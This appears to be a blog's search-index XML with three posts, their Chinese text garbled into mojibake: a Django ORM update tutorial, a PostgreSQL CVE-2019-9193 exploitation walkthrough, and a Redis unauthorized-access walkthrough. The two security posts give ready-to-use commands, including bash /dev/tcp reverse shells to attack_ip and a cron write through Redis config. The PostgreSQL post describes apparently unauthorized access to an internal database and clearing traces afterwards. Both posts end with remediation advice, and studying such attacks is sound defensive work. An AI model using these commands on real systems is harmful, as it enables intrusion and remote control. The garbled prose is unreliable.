<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Django modelç¯‡ï¼ˆä¸€ï¼‰ï¼šupdateç”¨æ³•ä»‹ç»</title>
    <link href="/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="model-updateå¸¸ç”¨æ–¹æ³•"><a href="#model-updateå¸¸ç”¨æ–¹æ³•" class="headerlink" title="model updateå¸¸ç”¨æ–¹æ³•"></a>model updateå¸¸ç”¨æ–¹æ³•</h3><p>æ–¹æ³•ä¸€ï¼š</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(username=<span class="hljs-string">'tachiulam'</span>,is_active=<span class="hljs-literal">True</span>)</code></pre><p>æ–¹æ³•äºŒï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><p>æ–¹æ³•ä¸€é€‚åˆæ›´æ–°ä¸€æ‰¹æ•°æ®ï¼Œç±»ä¼¼äºmysqlè¯­å¥update user set username=â€™tachiulamâ€™ where id = 1</p><p>æ–¹æ³•äºŒé€‚åˆæ›´æ–°ä¸€æ¡æ•°æ®ï¼Œä¹Ÿåªèƒ½æ›´æ–°ä¸€æ¡æ•°æ®ï¼Œå½“åªæœ‰ä¸€æ¡æ•°æ®æ›´æ–°æ—¶æ¨èä½¿ç”¨æ­¤æ–¹æ³•ï¼Œå¦å¤–æ­¤æ–¹æ³•è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹</p><h3 id="å…·æœ‰auto-nowå±æ€§å­—æ®µçš„æ›´æ–°"><a href="#å…·æœ‰auto-nowå±æ€§å­—æ®µçš„æ›´æ–°" class="headerlink" title="å…·æœ‰auto_nowå±æ€§å­—æ®µçš„æ›´æ–°"></a>å…·æœ‰auto_nowå±æ€§å­—æ®µçš„æ›´æ–°</h3><p>æˆ‘ä»¬é€šå¸¸ä¼šç»™è¡¨æ·»åŠ ä¸‰ä¸ªé»˜è®¤å­—æ®µ</p><ul><li><p>è‡ªå¢IDï¼Œè¿™ä¸ªdjangoå·²ç»é»˜è®¤åŠ äº†ï¼Œå°±åƒä¸Šè¾¹çš„å»ºè¡¨è¯­å¥ï¼Œè™½ç„¶åªå†™äº†usernameå’Œis_activeä¸¤ä¸ªå­—æ®µï¼Œä½†è¡¨å»ºå¥½åä¹Ÿä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„è‡ªå¢idå­—æ®µ</p></li><li><p>åˆ›å»ºæ—¶é—´ï¼Œç”¨æ¥æ ‡è¯†è¿™æ¡è®°å½•çš„åˆ›å»ºæ—¶é—´ï¼Œå…·æœ‰auto_now_addå±æ€§ï¼Œåˆ›å»ºè®°å½•æ—¶ä¼šè‡ªåŠ¨å¡«å……å½“å‰æ—¶é—´åˆ°æ­¤å­—æ®µ</p></li><li><p>ä¿®æ”¹æ—¶é—´ï¼Œç”¨æ¥æ ‡è¯†è¿™æ¡è®°å½•æœ€åä¸€æ¬¡çš„ä¿®æ”¹æ—¶é—´ï¼Œå…·æœ‰auto_nowå±æ€§ï¼Œå½“è®°å½•å‘ç”Ÿå˜åŒ–æ—¶å¡«å……å½“å‰æ—¶é—´åˆ°æ­¤å­—æ®µ<br>å°±åƒä¸‹è¾¹è¿™æ ·çš„è¡¨ç»“æ„</p></li></ul><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'åˆ›å»ºæ—¶é—´'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'æ›´æ–°æ—¶é—´'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç”¨æˆ·å'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'æ¿€æ´»çŠ¶æ€'</span>)</code></pre><p>å½“è¡¨æœ‰å­—æ®µå…·æœ‰auto_nowå±æ€§ä¸”ä½ å¸Œæœ›ä»–èƒ½è‡ªåŠ¨æ›´æ–°æ—¶ï¼Œå¿…é¡»ä½¿ç”¨ä¸Šè¾¹æ–¹æ³•äºŒçš„æ›´æ–°ï¼Œä¸ç„¶auto_nowå­—æ®µä¸ä¼šæ›´æ–°ï¼Œä¹Ÿå°±æ˜¯ï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><h3 id="json-dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ"><a href="#json-dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ" class="headerlink" title="json/dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ"></a>json/dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ</h3><p>ç›®å‰ä¸»æµçš„webå¼€æ”¾æ–¹å¼éƒ½è®²ç©¶å‰åç«¯åˆ†ç¦»ï¼Œåˆ†ç¦»ä¹‹åå‰åç«¯äº¤äº’çš„æ•°æ®æ ¼å¼å¤§éƒ½ç”¨é€šç”¨çš„jsonå‹ï¼Œé‚£ä¹ˆå¦‚ä½•ç”¨æœ€å°‘çš„ä»£ç æ–¹ä¾¿çš„æ›´æ–°jsonæ ¼å¼æ•°æ®åˆ°æ•°æ®åº“å‘¢ï¼ŸåŒæ ·å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p><p>æ–¹æ³•ä¸€ï¼š</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;User.objects.filter(id=<span class="hljs-number">1</span>).update(**data)</code></pre><ul><li><p>åŒæ ·è¿™ç§æ–¹æ³•ä¸èƒ½è‡ªåŠ¨æ›´æ–°å…·æœ‰auto_nowå±æ€§å­—æ®µçš„å€¼</p></li><li><p>é€šå¸¸æˆ‘ä»¬å†å˜é‡å‰åŠ ä¸€ä¸ªæ˜Ÿå·(*)è¡¨ç¤ºè¿™ä¸ªå˜é‡æ˜¯å…ƒç»„/åˆ—è¡¨ï¼ŒåŠ ä¸¤ä¸ªæ˜Ÿå·è¡¨ç¤ºè¿™ä¸ªå‚æ•°æ˜¯å­—å…¸</p></li></ul><p>æ–¹æ³•äºŒï¼š</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**data)_t.save()</code></pre><ul><li><p>æ–¹æ³•äºŒå’Œæ–¹æ³•ä¸€åŒæ ·æ— æ³•è‡ªåŠ¨æ›´æ–°auto_nowå­—æ®µçš„å€¼</p></li><li><p>æ³¨æ„è¿™é‡Œä½¿ç”¨åˆ°äº†ä¸€ä¸ªdictæ–¹æ³•</p></li></ul><p>æ–¹æ³•ä¸‰ï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><h3 id="ForeignKeyå­—æ®µæ›´æ–°"><a href="#ForeignKeyå­—æ®µæ›´æ–°" class="headerlink" title="ForeignKeyå­—æ®µæ›´æ–°"></a>ForeignKeyå­—æ®µæ›´æ–°</h3><p>å‡å¦‚æˆ‘ä»¬çš„è¡¨ä¸­æœ‰Foreignkeyå¤–é”®æ—¶ï¼Œè¯¥å¦‚ä½•æ›´æ–°å‘¢ï¼Ÿ</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'åˆ›å»ºæ—¶é—´'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'æ›´æ–°æ—¶é—´'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç”¨æˆ·å'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'æ¿€æ´»çŠ¶æ€'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'è§’è‰²'</span>)</code></pre><p>æ–¹æ³•ä¸€ï¼š</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(role=<span class="hljs-number">2</span>)</code></pre><ul><li><p>æœ€ç®€å•çš„æ–¹æ³•ï¼Œç›´æ¥è®©ç»™roleå­—æ®µè®¾ç½®ä¸ºä¸€ä¸ªidå³å¯</p></li><li><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨dictä½œä¸ºå‚æ•°æ›´æ–°ï¼š</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:<span class="hljs-number">3</span>&#125;)</code></pre></li></ul><p>æ–¹æ³•äºŒï¼š</p><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">2</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(role=_role)</code></pre><ul><li><p>ä¹Ÿå¯ä»¥èµ‹å€¼ä¸€ä¸ªå®ä¾‹ç»™role</p></li><li><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨dictä½œä¸ºå‚æ•°æ›´æ–°ï¼š</p></li></ul><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">1</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:_role&#125;)</code></pre><p>æ–¹æ³•ä¸‰ï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><ul><li><p>æ³¨æ„ï¼šè¿™é‡Œçš„roleå¿…é¡»èµ‹å€¼ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä¸èƒ½å†™idï¼Œä¸ç„¶ä¼šæŠ¥é”™â€User.roleâ€ must be a â€œRoleâ€ instance</p></li><li><p>å½“ä½¿ç”¨dictä½œä¸ºå‚æ•°æ›´æ–°æ—¶åˆæœ‰ä¸€ç‚¹ä¸åŒï¼Œå¦‚ä¸‹ä»£ç ï¼š</p></li></ul><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role_id'</span>:<span class="hljs-number">2</span>&#125;)_t.save()</code></pre><ul><li><p>Foreignkeyå¤–é”®å¿…é¡»åŠ ä¸Š<code>_id</code>ï¼Œä¾‹å¦‚ï¼š{â€˜role_idâ€™:3}</p></li><li><p>role_idåè¾¹å¿…é¡»è·Ÿä¸€ä¸ªidï¼ˆintæˆ–strç±»å‹éƒ½å¯ï¼‰ï¼Œä¸èƒ½è·Ÿroleå®ä¾‹</p></li></ul><h3 id="ManyToManyFieldå­—æ®µæ›´æ–°"><a href="#ManyToManyFieldå­—æ®µæ›´æ–°" class="headerlink" title="ManyToManyFieldå­—æ®µæ›´æ–°"></a>ManyToManyFieldå­—æ®µæ›´æ–°</h3><p>å‡å¦‚æˆ‘ä»¬çš„è¡¨ä¸­æœ‰ManyToManyFieldå­—æ®µæ—¶æ›´æ–°åˆæœ‰ä»€ä¹ˆå½±å“å‘¢ï¼Ÿ</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'åˆ›å»ºæ—¶é—´'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'æ›´æ–°æ—¶é—´'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç”¨æˆ·å'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'æ¿€æ´»çŠ¶æ€'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'è§’è‰²'</span>)    groups = models.ManyToManyField(Group, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç»„'</span>)</code></pre><p>m2mæ›´æ–°ï¼šm2må­—æ®µæ²¡æœ‰ç›´æ¥æ›´æ–°çš„æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡æ¸…ç©ºå†æ·»åŠ çš„æ–¹æ³•æ›´æ–°äº†</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.groups.clear()_t.groups.add(*[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>])_t.save()</code></pre><ul><li><p>add()ï¼šm2må­—æ®µæ·»åŠ ä¸€ä¸ªå€¼ï¼Œå½“æœ‰å¤šä¸ªå€¼çš„æ—¶å€™å¯ç”¨åˆ—è¡¨ï¼Œå‚ç…§ä¸Šè¾¹ä¾‹å­</p></li><li><p>_t.groups.add(2)</p></li><li><p>_t.groups.add(Group.objects.get(id=2))</p></li><li><p>remove()ï¼šm2må­—æ®µç§»é™¤ä¸€ä¸ªå€¼ï¼Œï¼Œå½“æœ‰å¤šä¸ªå€¼çš„æ—¶å€™å¯ç”¨åˆ—è¡¨ï¼Œå‚ç…§ä¸Šè¾¹ä¾‹å­</p></li><li><p>_t.groups.remove(2)</p></li><li><p>_t.groups.remove(Group.objects.get(id=2))</p></li><li><p>clear()ï¼šæ¸…ç©ºm2må­—æ®µçš„å€¼</p></li></ul><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDY1MzcyOQ==&mid=2247483702&idx=1&sn=720529d0cd15ecf11e07392d5da33a47&scene=21#wechat_redirect" target="_blank" rel="noopener">ğŸ”—åŸæ–‡é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>Django</category>
      
      <category>model</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PostgreSQLä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨ï¼ˆCVE-2019-9193)</title>
    <link href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/"/>
    <url>/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æ²¡äº‹æ›°æ›°å†…ç½‘ï¼Œå¶ç„¶å‘ç°äº†ä¸€ä¸ªä½¿ç”¨ç©ºå¯†ç çš„pgï¼ˆæ˜¯çš„ï¼Œè¿çˆ†ç ´éƒ½çœäº†ï¼‰ã€‚ç”¨navicatè¿ä¸Šå»çœ‹äº†ä¸‹å‡ ä¸ªåº“éƒ½æ˜¯ä¸€äº›ä¸šåŠ¡æµ‹è¯•æ•°æ®ï¼Œæ²¡ä»€ä¹ˆå¥½æ”¶é›†ï¼›ä¸æ­»å¿ƒï¼Œgoogleäº†ä¸€ä¸‹å‘ç°æœ‰ä¸ªæ¯”è¾ƒæ–°çš„CVEå¥½åƒå¯ä»¥æ“ä½œä¸€ä¸‹~</p><h4 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h4><p>æœ€è¿‘ï¼Œå®‰å…¨ç ”ç©¶äººå‘˜æŠ«éœ²äº†PostgreSQLå®ä¾‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-9193ï¼‰çš„æ¼æ´ç»†èŠ‚ã€‚å…·æœ‰æ•°æ®åº“ æœåŠ¡å™¨ æ–‡ä»¶è¯»å–æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p><p>ä»9.3ç‰ˆæœ¬å¼€å§‹ï¼ŒPostgresæ–°å¢äº†ä¸€ä¸ªCOPY TO/FROM PROGRAMåŠŸèƒ½ï¼Œå…è®¸æ•°æ®åº“çš„è¶…çº§ç”¨æˆ·ä»¥åŠpg_read_server_filesç»„ä¸­çš„ä»»ä½•ç”¨æˆ·æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>**å—å½±å“çš„ç‰ˆæœ¬ï¼ˆè²Œä¼¼æ›´æ–°ç‰ˆæœ¬æ— è§£ï¼‰</p><p>PostgreSQL&gt; = 9.3**</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="pgæ•°æ®åº“è¿æ¥"><a href="#pgæ•°æ®åº“è¿æ¥" class="headerlink" title="pgæ•°æ®åº“è¿æ¥"></a>pgæ•°æ®åº“è¿æ¥</h5><pre><code class="hljs plain"># è¿æ¥postgressqlï¼Œè™½ç„¶æ˜¯å†…ç½‘ipä½†è¿˜æ˜¯æ‰“ä¸€ä¸‹ç å§psql -U postgres -h 172.xx.xxx.xx</code></pre><p><img src="/img/pg_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰"><a href="#å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰" class="headerlink" title="å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰"></a>å¼€å§‹æ”»å‡»ï¼ˆç›´æ¥å¥—ç”¨ç½‘ä¸ŠPOCï¼‰</h5><pre><code class="hljs plain"># åˆ é™¤å¹¶åˆ›å»ºç”¨äºä¿å­˜ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç»“æœçš„è¡¨ DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);# å‘½ä»¤æ‰§è¡Œæµ‹è¯•ï¼Œå¤šè¯•å‡ æ¡COPY cmd_exec FROM PROGRAM &#39;id&#39;;COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;# æŸ¥çœ‹ç»“æœSELECT * FROM cmd_exec;</code></pre><p><img src="/img/pg_res2.png" srcset="/img/loading.gif" alt="image"><br>æˆ‘çš„ğŸï¼Œè¿˜æ˜¯ä¸ªrootç”¨æˆ·ï¼Œï¼Œéƒ½ä¸ç”¨ææƒäº†ï¼ˆè¿™å®‰å…¨æ„è¯†é˜¿ã€‚ã€‚ã€‚ï¼‰</p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>è™½ç„¶éƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œæ‹¿ä¸æ‹¿shellæ— æ‰€è°“ï¼Œä½†æ‹¿äº†è¿˜æ˜¯è¦æ–¹ä¾¿ä¸€äº›ï¼›</p><pre><code class="hljs plain"># attackæœºå™¨ä¸Šå¼€å¯ç›‘å¬nc -lvnp 8888# åˆ©ç”¨pgæ‰§è¡Œè¿œç¨‹è¿æ¥å‘½ä»¤COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8888 0&gt;&amp;1&#39;;</code></pre><p>attackæœºå™¨å·²ç»è¿”å›shellè¿æ¥äº†~<br><img src="/img/pg_res3.png" srcset="/img/loading.gif" alt="image"></p><p>è®°å½•ä¸€ä¸‹ï¼Œé¡ºä¾¿æ¸…é™¤è®°å½•æ”¶å·¥äº†ã€‚</p><h4 id="è§£å†³æ–¹æ¡ˆå»ºè®®"><a href="#è§£å†³æ–¹æ¡ˆå»ºè®®" class="headerlink" title="è§£å†³æ–¹æ¡ˆå»ºè®®"></a>è§£å†³æ–¹æ¡ˆå»ºè®®</h4><p>1ã€pg_read_server_filesï¼Œpg_write_server_fileså’Œpg_execute_server_programè§’è‰²æ¶‰åŠè¯»å–å’Œå†™å…¥å…·æœ‰å¤§æƒé™çš„æ•°æ®åº“æœåŠ¡å™¨æ–‡ä»¶ã€‚å°†æ­¤è§’è‰²æƒé™åˆ†é…ç»™æ•°æ®åº“ç”¨æˆ·æ—¶ï¼Œåº”æ…é‡è€ƒè™‘ã€‚</p><p>2ã€ä½¿ç”¨å¼ºå¯†ç ï¼ï¼ï¼</p><p>3ã€è¿›è¡Œç½‘ç»œéš”ç¦»ï¼Œåªå…è®¸éœ€è¦çš„IPè¿æ¥ï¼›</p><p><a href="https://zhuanlan.zhihu.com/p/143443516" target="_blank" rel="noopener">ğŸ”—çŸ¥ä¹é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨</title>
    <link href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="æ¼æ´ç®€ä»‹åŠå±å®³"><a href="#æ¼æ´ç®€ä»‹åŠå±å®³" class="headerlink" title="æ¼æ´ç®€ä»‹åŠå±å®³"></a>æ¼æ´ç®€ä»‹åŠå±å®³</h4><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€æ·»åŠ è®¡åˆ’ä»»åŠ¡ã€å†™å…¥Webshellç­‰æ“ä½œã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><h5 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h5><pre><code class="hljs plain"># rediså®‰è£…wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gztar -xvzf redis-3.2.0.tar.gzcd redis-3.2.0make# ä¿®æ”¹é…ç½®æ–‡ä»¶vim redis.conf# bind 127.0.0.1               å‰é¢åŠ ä¸Š#å·    # protected-modeè®¾ä¸ºno protected-mode no# ä¿å­˜é€€å‡º# å¯åŠ¨redis-serverredis-server redis-conf</code></pre><p>è§‚å¯Ÿåˆ°å¦‚ä¸‹è¾“å‡ºï¼Œæ¼æ´ç¯å¢ƒæ­å»ºæˆåŠŸ<br><img src="/img/redis_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h5><pre><code class="hljs plain"># åœ¨æ”»å‡»ä¸»æœºä¸Šæ‰“å¼€9999ç«¯å£ç›‘å¬[root@]# nc -vv -l -p 9999</code></pre><h5 id="æœªæˆæƒè®¿é—®éªŒè¯"><a href="#æœªæˆæƒè®¿é—®éªŒè¯" class="headerlink" title="æœªæˆæƒè®¿é—®éªŒè¯"></a>æœªæˆæƒè®¿é—®éªŒè¯</h5><pre><code class="hljs plain"># è¿æ¥é¶æœºredisredis -h target_ip# è·å–redisç‰ˆæœ¬ç­‰ä¿¡æ¯target_ip&gt; info</code></pre><p><img src="/img/redis_res2.png" srcset="/img/loading.gif" alt="image"></p><h5 id="å†™å…¥shell"><a href="#å†™å…¥shell" class="headerlink" title="å†™å…¥shell"></a>å†™å…¥shell</h5><pre><code class="hljs plain"># è®¾ç½®å˜é‡target_ip:6379&gt; set xx &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;9999 0&gt;&amp;1\n&quot;OK# ä¿®æ”¹redisé»˜è®¤ç›®å½•å’Œrdbæ–‡ä»¶target_ip:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cronOKtarget_ip:6379&gt; config set dbfilename rootOKtarget_ip:6379&gt; saveOK</code></pre><h5 id="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"><a href="#æˆåŠŸåå¼¹å®¿ä¸»æœºshell" class="headerlink" title="æˆåŠŸåå¼¹å®¿ä¸»æœºshell"></a>æˆåŠŸåå¼¹å®¿ä¸»æœºshell</h5><p><img src="/img/redis_res3.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ï¼Œæµ‹è¯•å®Œè®°å¾—å…³é—­å­˜åœ¨æ¼æ´çš„redis</p></blockquote><h4 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><p>æ–¹æ³•ä¸€ï¼š å¯ä»¥ä¿®æ”¹ç»‘å®šçš„IPã€ç«¯å£å’ŒæŒ‡å®šè®¿é—®è€…IP å…·ä½“æ ¹æ®å®é™…æƒ…å†µæ¥è®¾å®šï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨æœåŠ¡å™¨é˜²ç«å¢™ä¸Šåšè®¾ç½®ã€‚</p><p>æ–¹æ³•äºŒï¼š è®¾ç½®è®¿é—®å¯†ç  åœ¨ redis.conf ä¸­æ‰¾åˆ°â€œrequirepassâ€å­—æ®µï¼Œå–æ¶ˆæ³¨é‡Šå¹¶åœ¨åé¢å¡«ä¸Šä½ éœ€è¦çš„å¯†ç ã€‚ æ³¨ï¼šä¿®æ”¹redisçš„é…ç½®éœ€è¦é‡å¯redisæ‰èƒ½ç”Ÿæ•ˆã€‚</p><p>7 <a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">ğŸ”—çŸ¥ä¹é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
